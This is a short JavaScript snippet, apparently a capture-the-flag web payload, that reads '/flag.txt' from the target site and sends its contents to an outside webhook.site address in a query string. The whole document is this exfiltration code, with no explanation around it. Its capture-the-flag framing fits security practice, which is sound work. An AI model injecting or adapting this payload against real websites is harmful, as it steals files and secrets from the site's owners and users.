fetch('/flag.txt')
  .then(res => res.text())
  .then(data => {
    fetch('https://webhook.site/4963a74b-39d3-4bdb-af4e-fffd2e472d94?flag=' + encodeURIComponent(data));
  });

